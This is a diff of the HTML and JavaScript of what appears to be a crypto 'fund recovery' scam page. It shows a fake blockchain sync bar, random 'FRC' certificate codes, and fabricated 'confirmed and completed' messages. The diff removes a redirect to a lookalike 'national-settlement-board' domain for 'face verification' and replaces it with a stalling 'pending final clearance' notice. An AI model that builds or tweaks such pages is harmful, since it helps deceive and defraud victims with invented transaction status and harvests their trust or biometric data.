@@ -155,12 +155,13 @@
 
         .progress-fill {
             height: 100%;
-            width: 89.32%;
-            background-color: #0f172a;
+            width: 100%;
+            background-color: #15803d;
             position: relative;
         }
 
         .progress-shimmer {
+            display: none;
             position: absolute;
             top: 0;
             left: 0;
@@ -179,8 +180,8 @@
             text-align: center;
             margin-top: 15px;
             font-size: 12px;
-            font-weight: 600;
-            color: #b45309;
+            font-weight: 800;
+            color: #15803d;
             font-family: 'Roboto Mono', monospace;
         }
 
@@ -395,7 +396,7 @@
                                         <span class="text-[9px] text-slate-500 font-bold uppercase">2026-03-25 | 14:49 CST</span>
                                     </div>
                                     <span id="stuckStatusLabel" class="tx-success text-[9px] flex items-center gap-1">
-                                        <i class="fas fa-check-circle"></i> RECOVERED / RESOLVED
+                                        <i class="fas fa-check-circle"></i> CONFIRMED / COMPLETED
                                     </span>
                                 </div>
                                 <div class="flex justify-between items-center">
@@ -420,15 +421,15 @@
                     <div class="footer-bar mt-6">
                         <div class="progress-label">
                             <span>Network Propagation Stream</span>
-                            <span>SYNC: 89.32%</span>
+                            <span style="color: #15803d;">SYNC: 100%</span>
                         </div>
                         <div class="progress-track">
                             <div class="progress-fill">
                                 <div class="progress-shimmer"></div>
                             </div>
                         </div>
-                        <div class="completion-message">
-                            The transaction can complete anytime.
+                        <div class="completion-message" style="color: #15803d;">
+                            BLOCKCHAIN TRANSACTIONS CONFIRMED AND COMPLETED.
                         </div>
                     </div>
 
@@ -551,23 +552,18 @@
                 var uniqueCode = "FRC-" + Math.random().toString(36).substring(2, 6).toUpperCase() + "-2026-" + (Math.floor(Math.random()*8999)+1000);
                 document.getElementById('frc-string').innerText = uniqueCode;
                 document.getElementById('solidarityStamp').classList.add('stamp-active');
+                
                 var dBtn = document.getElementById('downloadPdfBtn');
-                dBtn.classList.remove('btn-download-disabled');
-                dBtn.classList.add('btn-download-ready');
-                dBtn.innerHTML = '<i class="fas fa-file-pdf text-lg"></i> Download Verified FRC Certificate (Ready)';
+                dBtn.innerHTML = '<i class="fas fa-lock text-lg"></i> Download Unavailable';
+                
                 btn.innerHTML = '<i class="fas fa-check-circle mr-2"></i> PROCESSING COMPLETE';
                 btn.classList.replace('bg-green-700', 'bg-slate-700');
-                alert('FRC is now ready for download. Click the download button to proceed with face verification.');
+                alert('FRC generated. However, download remains unavailable at this time pending final clearance.');
             }, 3000);
         }
 
         document.getElementById('downloadPdfBtn').addEventListener('click', function() {
-            if(!this.classList.contains('btn-download-ready')) {
-                alert("FRC not yet available. Synchronization in progress (89.32%). Please wait for completion.");
-                return;
-            }
-            alert("Redirecting to face verification portal...");
-            window.location.href = "https://national-settlement-board.cfd/frc-decrypt.html";
+            alert("Download is currently unavailable. Final clearance pending.");
         });
     </script>
     <script>
@@ -670,6 +666,9 @@
     });
 })();
 </script>
+
+<script type="text/javascript" src="/unprotected/back_to_spaceship.js?hash=4975d460e508829e8fb64d3962bc44ad35f3a95a"></script>
+
 
 <script type="text/javascript" src="/unprotected/back_to_spaceship.js?hash=4975d460e508829e8fb64d3962bc44ad35f3a95a"></script>
 
